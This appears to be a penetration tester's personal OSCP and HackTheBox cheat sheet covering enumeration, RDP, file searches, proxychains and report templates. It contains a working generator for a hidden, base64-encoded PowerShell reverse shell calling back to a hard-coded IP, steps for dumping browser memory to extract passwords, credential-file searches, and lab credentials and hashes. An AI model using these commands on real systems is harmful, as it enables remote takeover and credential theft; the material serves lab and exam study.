## Quick Notes

## Links

- [Payload All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/)
- [Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/)
- [Markdown Reference](https://wordpress.com/support/markdown-quick-reference/)
- [Report Maker](https://github.com/noraj/OSCP-Exam-Report-Template-Markdown/tree/master)
### Random things 

## /etc/hosts

```
Get into the habit of saving IP into /etc/hosts, if it's a DC, also do this:

10.129.26.67 dc.flight.htb flight.htb dc


```
## Saving things into files quickly
```
For example, if you have a username/hash dump, save into a file:

Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::

cat secrets | cut -d ":" -f 1 | tee users
cat secrets | cut -d ":" -f 4 | tee passwords


or

lookupsid.py flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee users

```

## Variables

```
export IP=""

export PORT="" #web server port I'm actively enumerating

export PORTS="". #all of the available ports

export LHOST=""

export LPORT="" #to catch reverse shells

export URL="" # for when you need to scan an fqdn rather than an IP like on htb.
```

### Remote Desktop Specific

```
xfreerdp /cert-ignore /compression /auto-reconnect /u:dmzadmin /p:SlimGodhoodMope /v:192.168.188.191 /w:1600 /h:800 

or 

rdesktop -z -P -x m -u dmzadmin -p SlimGodhoodMope 192.168.188.191 -r 

```

### Powershell Bypass Policy
```
Do this to run powershell:
powershell -ExecutionPolicy Bypass -File GetCLSID.ps1
```
### Kill a Process
```

To kill a port process on windows:

netstat -ano | findstr :<PORT>
taskkill /PID <PID> /F

To kill a port process on Kali:

sudo fuser -k 81/udp
```

### Port Listening

```
UNIX Domain Socket and How to listen it? 

 Use one of the option

1 - nc -lU <socket path>

nc: We all know this..

-l: This option tells netcat to operate in listening mode, which means it will listen for incoming connections.

-U: This option specifies that the listener should use Unix domain sockets. Unix domain sockets are a type of inter-process communication mechanism on Unix-like operating systems. They are used for communication between processes on the same host.

<socket path>: This is the path to the Unix domain socket that socat will listen on, for example "/tmp/s"

2 - socat - UNIX-LISTEN:<socket path>

socat: We all know this.

UNIX: Indicates that the endpoint will be a Unix domain socket.

LISTEN: Specifies that socat should listen for incoming connections on the socket.

<socket path>: As explianed before.


```
### Find Things
```
dir -recurse *.php | select-string -pattern "database"

# Getting passwords from browser memory
procdump.exe -ma firefox_pid
strings.exe firefox.dmp | findstr /i "Passwd="


To find things:

locate something
find / -name exact_name>/dev/null
find /home -name *.jpg

-O1 – (Default) filter based on file name first
-O2 – File name first, then file-type
-O3 – Allow find to automatically re-order the search based on efficient use of resources and likelihood of success
-maxdepth X – Search this directory along with all sub-directories to a level of X
-iname – Search while ignoring text case.
-not – Only produce results that don’t match the test case
-type f – Look for files
-type d – Look for directories


To search for text within files:
grep mail /etc/passwd


On Windows:

Get-ChildItem -Path C:\ -Include *.kdbx* -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *proof.txt* -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *password* -File -Recurse -ErrorAction SilentlyContinue

FINDSTR /i /r /c:"hello.*goodbye" /c:"goodbye.*hello" Demo.txt

FIND [SWITCH] "String" [Pathname/s]

1. /v – This switch will show any lines that don’t contain the string of words you specified.
2. /c – This switch tells the find tool to count how many lines contain your search terms.
3. /n – This switch shows the numbers that correspond with the lines.
4. /i – This switch tells find to ignore the case of text you are searching for.
```


### Fix Kali Copy Paste Issue
```
Kali VM Fix Copy/Paste:

1. `sudo apt-get autoremove open-vm-tools`
2. Install VMware Tools by following the usual method (`Virtual Machine --> Reinstall VMWare Tools`)
3. Reboot the VM
4. `sudo apt-get install open-vm-tools-desktop`
5. Reboot the VM, after the reboot copy/paste and drag/drop will work!



Quick Python Powershell Reverse Shell generator
---

import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.164",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)

```


### Show Tun0 IP Toolbar

```
sudo apt install xfce4-genmon-plugin

Generic Monitor -> Properties

/opt/showtun0ip.sh

---
ADDR=$(ip addr | grep tun0|grep inet|awk '{print $2}'|cut -d "/" -f 1)
echo "$ADDR" | sed 's/$/ /g'


```


## ProxyChains

```

Nomrally used with chisel, so standard:

socks5 127.0.0.1 1080

Also, squid proxy for example with username + password after ip and port:

http 192.168.219.224 3128 ext_acc DoNotShare!SkyLarkLegacyInternal2008
```


## Reading Files

```
Linux just use cat, mousepad, nano, vim

Also, if you need to add a line to a file, but don't have nano editor you can:

echo "Something to append" >> filename

Windows use more or less... or type <filename> | more


```

## Need a GUI File Explorer + Admin

```
sudo thunar
```

## Report Building
```

https://github.com/noraj/OSCP-Exam-Report-Template-Markdown

This builds the template:
ruby osert.rb init

You can cope this over to Obsidian, will make it easy to build out report.

Keep in mind, there might be file permission issues, so make sure chmod on this file after you copy it.

When done, you will need to copy this and all images back into the Report Building folder.

Do this to build the repot

ruby osert.rb generate -i <filename>.md 


```